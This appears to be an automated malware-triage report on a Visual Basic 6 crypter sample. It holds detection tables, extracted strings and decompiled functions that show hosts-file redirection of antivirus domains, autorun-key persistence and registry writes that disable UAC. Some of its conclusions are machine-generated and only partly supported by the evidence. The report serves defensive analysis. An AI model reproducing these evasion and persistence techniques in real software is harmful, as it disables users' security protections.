**sample_path:** /opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir  
**project_name:** incoming

> Every table below is copied from stage JSON. Technical narrative must cite these rows (engine + address/rule), not invent evidence.

## Verdict
- **verdict**: Malicious
- **score**: 9
- **family_guess**: Darty Crypter
- **agreement**: llm_and_v1_agree
- **cross_engine_notes**: IDA is non-functional (missing /usr/local/bin/idasql) so no IDA-derived data is available; all analysis is sourced from Ghidra, Malcat, capa, FLOSS, YARA, and pe_imports. No conflicting data exists between available sources: Ghidra decompilation and Malcat strings/anomalies both confirm hosts file hijacking, registry persistence, and dynamic imports, while YARA and FLOSS confirm VB6 compilation and dropper characteristics.
- **summary**: This is a malicious Visual Basic 6-compiled sample belonging to the Darty Crypter family, a crypter/loader used to package and obfuscate malicious payloads. The sample exhibits multiple malicious behaviors: it hijacks the system hosts file to block communication with major antivirus vendor domains, adds persistence via the HKCU autorun registry key, uses dynamic API resolution and XOR obfuscation to avoid static analysis, and spoofs ICQ application metadata to masquerade as legitimate software. A high-entropy overlay consistent with an encrypted payload is present, which is unpacked at runtime. Confirmed capabilities include dynamic linking, data compression, and tampering with system security settings.
- **source**: llm_judge
- **model**: step-3.7-flash

### key_evidence (triage) — cite source field exactly
| source | query_or_table | row_or_rule | why |
|---|---|---|---|
| malcat | static_profile/metadata | `VisualBasicInfos::PathInformation = *\AC:\Users\Owner\Desktop\Darty Crypter Sour` | Explicitly references the Darty Crypter source project, identifying the sample as part of the Darty Crypter family, a kn |
| malcat | decompilation (sub_40a3ac) | `Code writes 127.0.0.1 entries for symantec.com, mcafee.com, microsoft.com and ot` | Confirms malicious host file hijacking to block antivirus update and communication domains, a common AV evasion tactic t |
| malcat | strings/registry | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | Indicates a persistence mechanism via the user registry autorun key, ensuring the malware executes automatically on syst |
| pe_imports | signal imports | `LoadLibrary, GetProcAddress [T1129]` | Confirms use of dynamic API resolution, a common obfuscation technique to hide malicious functionality from static impor |
| malcat | anomalies | `XorInLoop@21773,22545` | Confirms XOR obfuscation of code or data, a standard anti-analysis and payload protection technique used by crypters to  |
| yara | rule matches | `Dropper_Strings, Misc_Suspicious_Strings` | YARA signatures explicitly flag the sample as containing dropper-related and suspicious strings, consistent with malicio |
| capa | top rules | `link function at runtime on Windows (T1129), compress data via WinAPI (T1560.002` | Confirms dynamic linking behavior and data compression capabilities, consistent with a crypter that unpacks/decrypts an  |
| malcat | static_profile/metadata | `VersionInfo::FileDescription = ICQ, OriginalFilename = ICQ.exe` | Spoofed legitimate ICQ instant messaging client metadata to masquerade as a benign application, a common social engineer |
| malcat | anomalies | `UnknownOverlayMediumToHighEntropy` | High-entropy unknown overlay is consistent with an encrypted/obfuscated payload embedded by the crypter, which is unpack |
| ghidra | decompilation (sub_408d80) | `Calls advapi32.ConvertStringSecurityDescriptorToSecurityDescriptorA and RegOpenK` | Indicates attempts to modify system security settings, likely to disable security center notifications or tamper with se |

## Deep-Dive Summary Evidence
- **source**: deep_dive_agentic
- **confidence**: 0
- **summary**: The sample is a 32-bit Windows GUI PE executable compiled with Microsoft Visual Basic 5/6, containing multiple independent indicators of malicious behavior including dropper-associated strings, hardcoded network indicators (domains, IPv4/IPv6 addresses, URLs), embedded base64 content, an overlay section, and SEH-related code patterns, all consistent with malware designed for payload delivery and command-and-control communication.

### deep key_evidence
- `{"source": "yara_scan rule match results", "query_or_table": "PE structure rule matches", "row_or_rule": "IsPE32, IsWindowsGUI, HasOverlay, HasRichSignature", "why": "Confirms the sample is a 32-bit Windows GUI PE executable with an embedded overlay and Rich signature, a common characteristic of malware that hides secondary payloads or malicious code in overlay sections to evade basic analysis."}`
- `{"source": "yara_scan rule match results", "query_or_table": "compilation framework rule matches", "row_or_rule": "Microsoft_Visual_Basic_v50, Microsoft_Visual_Basic_v50v60, Microsoft_Visual_Basic_v50_v60, Microsoft_Visual_Basic_v50_additional, Microsoft_Visual_Basic_v50v60_additional", "why": "Indicates the executable was compiled with Microsoft Visual Basic 5/6, a runtime frequently used to deve`
- `{"source": "yara_scan rule match results", "query_or_table": "behavioral string rule matches", "row_or_rule": "Dropper_Strings, Misc_Suspicious_Strings", "why": "Direct detection of strings associated with dropper functionality and other suspicious operational patterns, providing strong evidence of malicious intent and capability to deploy additional payloads post-execution."}`
- `{"source": "yara_scan rule match results", "query_or_table": "network indicator rule matches", "row_or_rule": "domain, IP (ipv4, ipv6), url, contains_base64", "why": "Presence of hardcoded network indicators (domains, IPv4/IPv6 addresses, URLs) and base64 content confirms the sample is configured for command-and-control communication or payload retrieval, a core function of most malware families."`
- `{"source": "yara_scan rule match results", "query_or_table": "obfuscation/exploit rule matches", "row_or_rule": "SEH__vba, SEH_Init", "why": "Detection of Structured Exception Handling (SEH) related code patterns, which are commonly used in malware for control flow obfuscation, exploit payload execution, or anti-analysis evasion."}`

## Malcat Structured Analysis
### Malcat File Summary
```
sha256: 8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075
size: 533054
type: PE
architecture: X86
entrypoint_ea: 6140
entropy: 135
file_name: virussign.com_780d28e33c39a8513613918671ac0b78.vir
```

### File Layout (sections/regions)
| Name | EA | Physical | Virtual | Entropy | Rights |
|---|---|---|---|---|---|
| header | 0 | 4096 | 0 | 15 | - |
| .text | 4096 | 53248 | 53248 | 103 | RX |
| .data | 57344 | 4096 | 8192 | 4 | RW |
| .rsrc | 65536 | 466944 | 466944 | 141 | R |
| overlay | 532480 | 4670 | 0 | 121 | - |

### Malcat YARA / Signatures (8)
| Rule | Category | Type | Reliability | Description |
|---|---|---|---|---|
| MSVC_6_linker | compiler | INFO | 60 | detects used visual studio version based on linker information |
| VisualBasic | language | INFO | 100 | VisualBasic executable (pcode or native) |
| CreateRegistryEntryUsingBatch | persistence | UNCOMMON | 30 | create a registry entry using batch commands (reg.exe ..). Often used by malware |
| AutorunKey | persistence | UNCOMMON | 20 | file contains path of an autorun key |
| RunShell | lateral movement | UNCOMMON | 70 | starts a shell |
| Wscript | lateral movement | SUSPICIOUS | 30 | runs a wscript script (vbs, js, ..) |
| ms_visual_basic_50_60_01 | compiler | INFO | 50 |  |
| ms_visual_basic_50_01 | compiler | INFO | 50 |  |

### Anomalies (10)
| Name | Level | Category | Hits | Description |
|---|---|---|---|---|
| InvalidChecksum | 4 | integrity | 1 | PE Header checksum is wrong |
| PossibleDownloaderApiDynamicImport | 4 | imports | 1 | A downloader-related api (recv, InternetConnect, etc.) is present as string in the binary, but is no |
| PossiblePackerApiDynamicImport | 4 | imports | 5 | A packer-related api (VirtualProtect, ResumeThread, etc.) is present as string in the binary, but is |
| UnknownRootResourceDirectoryId | 4 | resources | 1 | A root resource directory ID is not standard |
| UnparsedVersionInfo | 4 | resources | 1 | Version informations were not fully parsed |
| StackArrayInitialisationX86 | 3 | code | 4 | An array of data is dynamically built on the stack, sometimes used to build shellcodes or strings |
| UnknownOverlayMediumToHighEntropy | 3 | entropy | 1 | File contains an overlay which is not of known type and has medium-to-high entropy |
| VBExternalApi | 3 | imports | 3 | VB project uses external Win32 APIs (most likely via DllFunctionCall) |
| XorInLoop | 3 | code | 2 | XOR instruction in a loop |
| BoundImports | 2 | imports | 1 | Bound imports are present |

### Anomaly Locations (high-signal)
- **XorInLoop**
  - `21773`: 
  - `22545`: 

### High-Signal Strings (6 matched keywords; engine=malcat)
| EA | String |
|---|---|
| 12860 | `kernel32` |
| 13052 | `Kernel32` |
| 10904 | `KERNEL32` |
| 52808 | `kernel32.dll` |
| 600 | `kernel32.dll` |
| 10740 | `kernel32.dll` |

### Top Strings (300 extracted; showing 80)
| EA | String |
|---|---|
| 18804 | `HKCU\Software\Mi..rrentVersion\Run` |
| 18964 | `Scripting.FileSystemObject` |
| 18932 | `ShellExecuteW` |
| 17076 | ` /t REG_SZ /d ` |
| 13556 | `SOFTWARE\Microso..\Policies\System` |
| 12608 | `B8000000005058909090C3` |
| 13376 | `SOFTWARE\Microso..\Security Center` |
| 14664 | `127.0.2.5\tliveu..veupdate.com\r\n` |
| 13776 | `\tmpduzhfg89fgdg..fdzuudgzfgfd.exe` |
| 14216 | `127.0.2.5\tsecur..symantec.com\r\n` |
| 18260 | `127.0.2.5\twindo..icrosoft.com\r\n` |
| 15472 | `127.0.2.5\twww.n..sociates.com\r\n` |
| 11780 | `select name from..where name='---'` |
| 13248 | `Ntdll.dll` |
| 16920 | `127.0.2.5\thouse..endmicro.com\r\n` |
| 16636 | `127.0.2.5\tcusto..symantec.com\r\n` |
| 15560 | `127.0.2.5\tnetwo..sociates.com\r\n` |
| 16552 | `127.0.2.5\tliveu..symantec.com\r\n` |
| 17112 | `127.0.2.5\twww.p..software.com\r\n` |
| 16412 | `127.0.2.5\tupdat..symantec.com\r\n` |
| 18352 | `127.0.2.5\tvirus..an.jotti.org\r\n` |
| 17884 | `127.0.2.5\twww.microsoft.com\r\n` |
| 15948 | `127.0.2.5\tdownl..d.mcafee.com\r\n` |
| 18184 | `127.0.2.5\tupdat..icrosoft.com\r\n` |
| 14068 | `C:\WINDOWS\syste..rivers\etc\hosts` |
| 16336 | `127.0.2.5\tupdat..symantec.com\r\n` |
| 18748 | `service.exe` |
| 16024 | `127.0.2.5\tdispa..h.mcafee.com\r\n` |
| 14768 | `127.0.2.5\twww.viruslist.com\r\n` |
| 18520 | `127.0.2.5\tnovirusthanks.org\r\n` |
| 15876 | `127.0.2.5\twww.my-etrust.com\r\n` |
| 18048 | `127.0.2.5\twww.v..rustotal.com\r\n` |
| 16784 | `127.0.2.5\ttrendmicro.com\r\n` |
| 17192 | `127.0.2.5\tfree.grisoft.com\r\n` |
| 15744 | `127.0.2.5\tmast.mcafee.com\r\n` |
| 13852 | `\tmpjhgTFztfZ789tfzTDt.exe` |
| 17004 | `127.0.2.5\tpandasoftware.com\r\n` |
| 14424 | `127.0.2.5\twww.sophos.com\r\n` |
| 17444 | `127.0.2.5\twww.clamav.net\r\n` |
| 17824 | `127.0.2.5\twww.cert.org\r\n` |
| 17260 | `127.0.2.5\twww.grisoft.com\r\n` |
| 17956 | `127.0.2.5\tmicrosoft.com\r\n` |
| 16716 | `127.0.2.5\trads.mcafee.com\r\n` |
| 14544 | `127.0.2.5\twww.mcafee.com\r\n` |
| 14964 | `127.0.2.5\twww.f-secure.com\r\n` |
| 15088 | `127.0.2.5\twww.f-prot.com\r\n` |
| 15400 | `127.0.2.5\twww.kaspersky.com\r\n` |
| 16100 | `127.0.2.5\tsecure.nai.com\r\n` |
| 15216 | `127.0.2.5\tkaspe..sky-labs.com\r\n` |
| 14364 | `127.0.2.5\twww.sarc.com\r\n` |
| 17584 | `127.0.2.5\twww.free-av.com\r\n` |
| 17652 | `127.0.2.5\twww.avast.com\r\n` |
| 14840 | `127.0.2.5\tviruslist.com\r\n` |
| 16488 | `127.0.2.5\tus.mcafee.com\r\n` |
| 15812 | `127.0.2.5\tmy-etrust.com\r\n` |
| 16216 | `127.0.2.5\twww.nai.com\r\n` |
| 15640 | `127.0.2.5\twww.ca.com\r\n` |
| 18428 | `127.0.2.5\tjotti.org\r\n` |
| 14148 | `127.0.2.5\tsymantec.com\r\n` |
| 16848 | `127.0.2.5\twww.t..endmicro.com\r\n` |
| 17772 | `127.0.2.5\tcert.org\r\n` |
| 15288 | `127.0.2.5\twww.avp.com\r\n` |
| 14608 | `127.0.2.5\tmcafee.com\r\n` |
| 15032 | `127.0.2.5\tf-prot.com\r\n` |
| 14904 | `127.0.2.5\tf-secure.com\r\n` |
| 15152 | `127.0.2.5\tkaspersky.com\r\n` |
| 17328 | `127.0.2.5\tgrisoft.com\r\n` |
| 17388 | `127.0.2.5\tclamav.net\r\n` |
| 14488 | `127.0.2.5\tsophos.com\r\n` |
| 16276 | `127.0.2.5\tvil.nai.com\r\n` |
| 13316 | `advapi32.dll` |
| 17508 | `127.0.2.5\tfree-av.com\r\n` |
| 12884 | `GetEnvironmentVariableW` |
| 14312 | `127.0.2.5\tsarc.com\r\n` |
| 17716 | `127.0.2.5\tavast.com\r\n` |
| 11116 | `NtAllocateVirtualMemory` |
| 16164 | `127.0.2.5\tnai.com\r\n` |
| 15696 | `127.0.2.5\tca.com\r\n` |
| 15348 | `127.0.2.5\tavp.com\r\n` |
| 18120 | `127.0.2.5\tvirustotal.com\r\n` |

### Constants / Known Patterns (1)
| Category | Value |
|---|---|
| registry | `registry::HKEY_LOCAL_MACHINE` |

### Imports (128)
| EA | Name | Type | Refs |
|---|---|---|---|
| 4096 | kernel32.GetProcAddress | IMPORT | 7 |
| 4100 | kernel32.RtlMoveMemory | IMPORT | 8 |
| 4104 | kernel32.LoadLibraryA | IMPORT | 2 |
| 4112 | user32.CallWindowProcA | IMPORT | 3 |
| 4120 | msvbvm60.__vbaVarTstGt | IMPORT | 3 |
| 4124 | msvbvm60._CIcos | IMPORT | 1 |
| 4128 | msvbvm60._adj_fptan | IMPORT | 1 |
| 4132 | msvbvm60.__vbaVarMove | IMPORT | 23 |
| 4136 | msvbvm60.__vbaStrI4 | IMPORT | 2 |
| 4140 | msvbvm60.__vbaVarVargNofree | IMPORT | 2 |
| 4144 | msvbvm60.__vbaAryMove | IMPORT | 4 |
| 4148 | msvbvm60.__vbaFreeVar | IMPORT | 29 |
| 4152 | msvbvm60.__vbaGosubReturn | IMPORT | 2 |
| 4156 | msvbvm60.__vbaStrVarMove | IMPORT | 5 |
| 4160 | msvbvm60.__vbaLenBstr | IMPORT | 4 |
| 4164 | msvbvm60.__vbaEnd | IMPORT | 5 |
| 4168 | msvbvm60.__vbaPut3 | IMPORT | 2 |
| 4172 | msvbvm60.__vbaFreeVarList | IMPORT | 17 |
| 4176 | msvbvm60._adj_fdiv_m64 | IMPORT | 1 |
| 4180 | msvbvm60.__vbaNextEachVar | IMPORT | 2 |
| 4184 | msvbvm60.rtcAnsiValueBstr | IMPORT | 4 |
| 4188 | msvbvm60._adj_fprem1 | IMPORT | 1 |
| 4192 | msvbvm60.rtcGetObject | IMPORT | 2 |
| 4196 | msvbvm60.__vbaStrCat | IMPORT | 14 |
| 4200 | msvbvm60.__vbaLsetFixstr | IMPORT | 2 |
| 4204 | msvbvm60.__vbaSetSystemError | IMPORT | 3 |
| 4208 | msvbvm60.__vbaHresultCheckObj | IMPORT | 5 |
| 4212 | msvbvm60._adj_fdiv_m32 | IMPORT | 1 |
| 4216 | msvbvm60.__vbaAryVar | IMPORT | 2 |
| 4220 | msvbvm60.__vbaAryDestruct | IMPORT | 26 |
| 4224 | msvbvm60.__vbaVarForInit | IMPORT | 2 |
| 4228 | msvbvm60.rtcRandomNext | IMPORT | 2 |
| 4232 | msvbvm60.rtcRandomize | IMPORT | 2 |
| 4236 | msvbvm60.rtcMsgBox | IMPORT | 3 |
| 4240 | msvbvm60.__vbaOnError | IMPORT | 4 |
| 4244 | msvbvm60._adj_fdiv_m16i | IMPORT | 1 |
| 4248 | msvbvm60.__vbaObjSetAddref | IMPORT | 4 |
| 4252 | msvbvm60._adj_fdivr_m16i | IMPORT | 1 |
| 4256 | msvbvm60.__vbaVarTstLt | IMPORT | 2 |
| 4260 | msvbvm60._CIsin | IMPORT | 1 |
| 4264 | msvbvm60.__vbaErase | IMPORT | 35 |
| 4268 | msvbvm60.rtcMidCharBstr | IMPORT | 3 |
| 4272 | msvbvm60.__vbaVarZero | IMPORT | 11 |
| 4276 | msvbvm60.__vbaChkstk | IMPORT | 1 |
| 4280 | msvbvm60.__vbaGosubFree | IMPORT | 2 |
| 4284 | msvbvm60.__vbaFileClose | IMPORT | 3 |
| 4288 | msvbvm60.EVENT_SINK_AddRef | IMPORT | 1 |
| 4292 | msvbvm60.__vbaGenerateBoundsError | IMPORT | 54 |
| 4296 | msvbvm60.rtcKillFiles | IMPORT | 3 |
| 4300 | msvbvm60.__vbaStrCmp | IMPORT | 6 |
| 4304 | msvbvm60.__vbaVarTstEq | IMPORT | 3 |
| 4308 | msvbvm60.__vbaAryConstruct2 | IMPORT | 5 |
| 4312 | msvbvm60.__vbaCyI4 | IMPORT | 2 |
| 4316 | msvbvm60.__vbaObjVar | IMPORT | 5 |
| 4320 | msvbvm60.__vbaI2I4 | IMPORT | 4 |
| 4324 | msvbvm60.DllFunctionCall | IMPORT | 1 |
| 4328 | msvbvm60.__vbaRedimPreserve | IMPORT | 2 |
| 4332 | msvbvm60._adj_fpatan | IMPORT | 1 |
| 4336 | msvbvm60.__vbaFixstrConstruct | IMPORT | 2 |
| 4340 | msvbvm60.__vbaRedim | IMPORT | 27 |
| 4344 | msvbvm60.EVENT_SINK_Release | IMPORT | 1 |
| 4348 | msvbvm60.rtcShell | IMPORT | 3 |
| 4352 | msvbvm60.__vbaUI1I2 | IMPORT | 4 |
| 4356 | msvbvm60._CIsqrt | IMPORT | 1 |
| 4360 | msvbvm60.EVENT_SINK_QueryInterface | IMPORT | 1 |
| 4364 | msvbvm60.__vbaUI1I4 | IMPORT | 2 |
| 4368 | msvbvm60.__vbaExceptHandler | IMPORT | 1 |
| 4372 | msvbvm60.rtcSplit | IMPORT | 2 |
| 4376 | msvbvm60.__vbaPrintFile | IMPORT | 67 |
| 4380 | msvbvm60.rtcReplace | IMPORT | 4 |
| 4384 | msvbvm60.__vbaStrToUnicode | IMPORT | 3 |
| 4388 | msvbvm60._adj_fprem | IMPORT | 1 |
| 4392 | msvbvm60._adj_fdivr_m64 | IMPORT | 1 |
| 4396 | msvbvm60.__vbaGosub | IMPORT | 2 |
| 4400 | msvbvm60.rtcVarBstrFromAnsi | IMPORT | 2 |
| 4404 | msvbvm60.rtcCreateObject2 | IMPORT | 2 |
| 4408 | msvbvm60.__vbaFPException | IMPORT | 1 |
| 4412 | msvbvm60.rtcStrConvVar2 | IMPORT | 3 |
| 4416 | msvbvm60.__vbaStrVarVal | IMPORT | 2 |
| 4420 | msvbvm60.__vbaUbound | IMPORT | 7 |

### Functions (30)
| EA | Name |
|---|---|
| 36224 | sub_408d80 |
| 21296 | sub_405330 |
| 41900 | sub_40a3ac |
| 37760 | sub_409380 |
| 47104 | sub_40b800 |
| 48544 | sub_40bda0 |
| 24400 | sub_405f50 |
| 22702 | sub_4058ae |
| 51568 | sub_40c970 |
| 32576 | sub_407f40 |
| 29056 | sub_407180 |
| 23744 | sub_405cc0 |
| 29664 | sub_4073e0 |
| 33456 | sub_4082b0 |
| 30752 | sub_407820 |
| 34816 | sub_408800 |
| 34064 | sub_408510 |
| 50048 | sub_40c380 |
| 34530 | sub_4086e2 |
| 46656 | sub_40b640 |
| 33192 | sub_4081a8 |
| 28255 | sub_406e5f |
| 32170 | sub_407daa |
| 28640 | sub_406fe0 |
| 31973 | sub_407ce5 |
| 30539 | sub_40774b |
| 33963 | sub_4084ab |
| 34452 | sub_408694 |
| 36126 | sub_408d1e |
| 23584 | sub_405c20 |

### Decompilations (top 6)
#### 36224 — sub_408d80
```c

/* DISPLAY WARNING: Type casts are NOT being printed */

void sub_408d80(void)

{
    code *pcVar1;
    code *pcVar2;
    int32_t iVar3;
    undefined4 *unaff_FS_OFFSET;
    int32_t iStack_80;
    undefined4 uStack_7c;
    undefined4 uStack_74;
    undefined4 uStack_6c;
    undefined4 uStack_64;
    undefined4 uStack_5c;
    undefined4 uStack_54;
    undefined4 uStack_4c;
    undefined4 uStack_44;
    undefined4 uStack_3c;
    undefined4 uStack_34;
    undefined4 uStack_2c;
    undefined4 *puStack_24;
    undefined4 uStack_1c;
    undefined4 uStack_18;
    undefined4 uStack_14;
    code *pcStack_10;
    undefined *puStack_c;
    undefined4 uStack_8;
    
    pcStack_10 = jmp_msvbvm60.__vbaExceptHandler;
    uStack_14 = *unaff_FS_OFFSET;
    *unaff_FS_OFFSET = &uStack_14;
    pcVar2 = msvbvm60.__vbaRedim;
    puStack_c = &stack0xffffff44;
    uStack_8 = 0x4013a8;
    uStack_18 = 0;
    uStack_1c = 0;
    uStack_2c = 0;
    uStack_3c = 0;
    uStack_4c = 0;
    uStack_5c = 0;
    uStack_6c = 0;
    uStack_7c = 0;
    iStack_80 = 0;
    (*msvbvm60.__vbaRedim)(0x880, 0x10, &uStack_1c, 0, 1, 3, 0);
    pcVar1 = msvbvm60.__vbaVarMove;
    puStack_24 = 0x11;
    uStack_2c = 2;
    (*msvbvm60.__vbaVarMove)();
    uStack_34 = 1;
    uStack_3c = 2;
    (*pcVar1)();
    uStack_4c = 2;
    uStack_44 = 1;
    (*pcVar1)();
    uStack_54 = 0;
    uStack_5c = 2;
    (*pcVar1)();
    func_0x004058c0("Ntdll.dll", "RtlAdjustPrivilege", &uStack_1c);
    (*msvbvm60.__vbaErase)(0, &uStack_1c);
    (*pcVar2)(0x880, 0x10, &uStack_1c, 0, 1, 2, 0);
    puStack_24 = 0x80000002;
    uStack_2c = 3;
    (*pcVar1)();
    uStack_34 = (*msvbvm60.VarPtr)("SOFTWARE\\Microsoft\\Security Center");
    uStack_3c = 3;
    (*pcVar1)();
    uStack_44 = (*msvbvm60.VarPtr)(&uStack_18);
    uStack_4c = 3;
    (*pcVar1)();
    iStack_80 = func_0x004058c0("advapi32.dll", "RegOpenKeyW", &uStack_1c);
    (*msvbvm60.__vbaErase)(0, &uStack_1c);
    if (iStack_80 == 0) {
        (*pcVar2)(0x880, 0x10, &uStack_1c, 0, 1, 5, 0);
        puStack_24 = &uStack_18;
        uStack_2c = 0x4003;
        (*msvbvm60.__vbaVarZero)();
        uStack_34 = (*msvbvm60.VarPtr)("UACDisableNotify");
        uStack_3c = 3;
        (*pcVar1)();
        uStack_4c = 2;
        uStack_44 = 0;
        (*pcVar1)();
        uStack_54 = 4;
        uStack_5c = 2;
        (*pcVar1)();
        iStack_80 = 0;
        uStack_64 = (*msvbvm60.VarPtr)(&iStack_80);
        uStack_6c = 3;
        (*pcVar1)();
        uStack_74 = 4;
        uStack_7c = 2;
        (*pcVar1)();
        iVar3 = func_0x004058c0("advapi32.dll", "RegSetValueExW", &uStack_1c);
        (*msvbvm60.__vbaErase)(0, &uStack_1c);
        if (iVar3 == 0) {
            (*pcVar2)(0x880, 0x10, &uStack_1c, 0, 1, 0, 0);
            puStack_24 = &uStack_18;
            uStack_2c = 0x4003;
            (*msvbvm60.__vbaVarZero)();
            func_0x004058c0("advapi32.dll", "RegCloseKey", &uStack_1c);
            (*msvbvm60.__vbaErase)(0, &uStack_1c);
        }
    }
    (*pcVar2)(0x880, 0x10, &uStack_1c, 0, 1, 2, 0);
    puStack_24 = 0x80000002;
    uStack_2c = 3;
    (*pcVar1)();
    uStack_34 = (*msvbvm60.VarPtr)("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
    uStack_3c = 3;
    (*pcVar1)();
    uStack_44 = (*msvbvm60.VarPtr)(&uStack_18);
    uStack_4c = 3;
    (*pcVar1)();
    iStack_80 = func_0x004058c0("advapi32.dll", "RegOpenKeyW", &uStack_1c);
    (*msvbvm60.__vbaErase)(0, &uStack_1c);
    if (iStack_80 == 0) {
        (*pcVar2)(0x880, 0x10, &uStack_1c, 0, 1, 5, 0);
        puStack_24 = &uStack_18;
        uStack_2c = 0x4003;
        (*msvbvm60.__vbaVarZero)();
        uStack_34 = (*msvbvm60.VarPtr)("EnableLUA");
        uStack_3c = 3;
        (*pcVar1)();
        uStack_4c = 2;
        uStack_44 = 0;
        (*pcVar1)();
        uStack_54 = 4;
        uStack_5c = 2;
        (*pcVar1)();
        iStack_80 = 0;
        uStack_64 = (*msvbvm60.VarPtr)(&iStack_80);
        uStack_6c = 3;
        (*pcVar1)();
        uStack_74 = 
```
#### 21296 — sub_405330
```c

/* WARNING: Removing unreachable block (ram,0x004056dc) */

/* DISPLAY WARNING: Type casts are NOT being printed */

void sub_405330(int16_t **param_1,uint32_t *param_2)

{
    int16_t *piVar1;
    code *pcVar2;
    code *pcVar3;
    undefined uVar4;
    int16_t iVar5;
    int32_t iVar6;
    uint32_t uVar7;
    int32_t iVar8;
    code **ppcVar9;
    undefined4 uVar10;
    int32_t iVar11;
    code *pcVar12;
    uint32_t uVar13;
    undefined4 *unaff_FS_OFFSET;
    bool bVar14;
    int32_t iVar15;
    uint32_t uStack_154;
    uint32_t uStack_150;
    undefined4 uStack_14c;
    uint32_t *puStack_148;
    code *pcStack_144;
    uint32_t *puStack_140;
    undefined4 uStack_13c;
    undefined4 uStack_138;
    undefined4 *puStack_134;
    uint32_t uStack_130;
    undefined4 uStack_12c;
    code *pcStack_128;
    uint32_t uStack_124;
    code *pcStack_120;
    undefined4 uStack_11c;
    code *pcStack_118;
    code **ppcStack_114;
    undefined4 *puStack_110;
    undefined4 uStack_10c;
    undefined **ppuStack_108;
    int16_t *piStack_104;
    undefined **ppuStack_100;
    code *pcStack_fc;
    undefined4 uStack_f8;
    undefined4 uStack_f4;
    undefined4 uStack_f0;
    int16_t **ppiStack_ec;
    uint32_t uStack_e8;
    undefined *puStack_e4;
    undefined4 uStack_e0;
    undefined4 uStack_dc;
    undefined *puStack_d8;
    undefined4 uStack_d4;
    undefined4 uStack_d0;
    uint32_t uStack_c0;
    uint32_t uStack_bc;
    undefined *puStack_8c;
    undefined *apuStack_88 [5];
    undefined4 auStack_74 [2];
    undefined4 uStack_6c;
    undefined4 uStack_64;
    undefined4 uStack_60;
    int32_t iStack_5c;
    undefined auStack_54 [12];
    int32_t iStack_48;
    undefined auStack_38 [12];
    int32_t iStack_2c;
    undefined4 uStack_20;
    uint32_t uStack_1c;
    uint32_t uStack_18;
    undefined4 uStack_14;
    code *pcStack_10;
    undefined *puStack_c;
    undefined4 uStack_8;
    
    pcStack_10 = jmp_msvbvm60.__vbaExceptHandler;
    uStack_14 = *unaff_FS_OFFSET;
    *unaff_FS_OFFSET = &uStack_14;
    pcVar12 = msvbvm60.__vbaAryConstruct2;
    puStack_c = &stack0xffffff34;
    uStack_8 = 0x4011f8;
    uStack_d0 = 0x11;
    uStack_60 = 0;
    uStack_64 = 0;
    auStack_74[0] = 0;
    apuStack_88[0] = 0x0;
    puStack_8c = 0x0;
    uStack_d4 = 0x4027c0;
    puStack_d8 = auStack_38;
    uStack_dc = 0x405386;
    (*msvbvm60.__vbaAryConstruct2)();
    uStack_dc = 0x11;
    uStack_e0 = 0x4027c0;
    puStack_e4 = auStack_54;
    uStack_e8 = 0x405393;
    (*pcVar12)();
    uStack_e8 = *param_2;
    ppiStack_ec = 0x40539f;
    (*msvbvm60.__vbaLenBstr)();
    pcVar12 = msvbvm60.__vbaI2I4;
    ppiStack_ec = 0x4053a9;
    uStack_20 = (*msvbvm60.__vbaI2I4)();
    pcVar3 = msvbvm60.__vbaI4Str;
    ppiStack_ec = 0x402798;
    uStack_f0 = 0x4053b9;
    (*msvbvm60.__vbaI4Str)();
    uStack_f0 = 0x4053bd;
    uStack_1c = (*pcVar12)();
    uStack_f0 = 0x402798;
    uStack_f4 = 0x4053c7;
    (*pcVar3)();
    uStack_f4 = 0x4053cb;
    uStack_18 = (*pcVar12)();
    uStack_f4 = 0x4027a0;
    uStack_f8 = 0x4053d5;
    iVar6 = (*pcVar3)();
    uStack_f8 = 0x402798;
    pcStack_fc = 0x4053e2;
    uVar7 = (*pcVar3)();
    do {
        if (iVar6 < uVar7) {
            pcStack_fc = 0x402798;
            ppuStack_100 = 0x405558;
            (*pcVar3)();
            ppuStack_100 = 0x40555c;
            uStack_1c = (*pcVar12)();
            ppuStack_100 = 0x4027a0;
            piStack_104 = 0x405566;
            iVar6 = (*pcVar3)();
            piStack_104 = 0x402798;
            ppuStack_108 = 0x405573;
            uVar7 = (*pcVar3)();
            goto code_r0x00405573;
        }
        pcStack_fc = 0x4027ac;
        ppuStack_100 = 0x4053f7;
        iVar8 = (*pcVar3)();
        uVar13 = uVar7;
        if (SCARRY4(iVar8, uStack_1c)) break;
        pcStack_fc = 0x405407;
        uStack_1c = (*pcVar12)();
        if (uStack_20 < uStack_1c) {
            pcStack_fc = 0x4027ac;
            ppuStack_100 = 0x405417;
            (*pcVar3)();
            ppuStack_10
```
#### 41900 — sub_40a3ac
```c

/* DISPLAY WARNING: Type casts are NOT being printed */

void sub_40a3ac(void)

{
    code *pcVar1;
    code *pcVar2;
    undefined4 uVar3;
    undefined4 *unaff_FS_OFFSET;
    undefined4 auStack_44 [2];
    undefined4 uStack_3c;
    undefined4 uStack_34;
    undefined4 auStack_30 [2];
    undefined4 uStack_28;
    undefined4 uStack_18;
    code *pcStack_14;
    undefined *puStack_10;
    undefined4 uStack_c;
    
    (*msvbvm60.__vbaErrorOverflow)();
    pcStack_14 = jmp_msvbvm60.__vbaExceptHandler;
    uStack_18 = *unaff_FS_OFFSET;
    *unaff_FS_OFFSET = &uStack_18;
    puStack_10 = &stack0xfffffe90;
    uStack_c = 0x4013d0;
    uStack_28 = 0;
    auStack_30[0] = 0;
    uStack_34 = 0;
    uStack_3c = 0x80020004;
    auStack_44[0] = 10;
    (*msvbvm60.rtcFreeFile)(auStack_44);
    (*msvbvm60.__vbaFreeVar)();
    pcVar1 = msvbvm60.__vbaI2I4;
    uVar3 = (*msvbvm60.__vbaI2I4)("C:\\WINDOWS\\system32\\drivers\\etc\\hosts");
    (*msvbvm60.__vbaFileOpen)(2, 0xffffffff, uVar3);
    sub_40b640("127.0.2.5\\tsymantec.com\\r\\n");
    pcVar2 = msvbvm60.__vbaStrMove;
    (*msvbvm60.__vbaStrMove)();
    uStack_34 = 0;
    uVar3 = (*pcVar2)();
    uVar3 = (*pcVar1)(uVar3);
    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);
    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);
    sub_40b640("127.0.2.5\\tsecurityresponse.symantec.com\\r\\n");
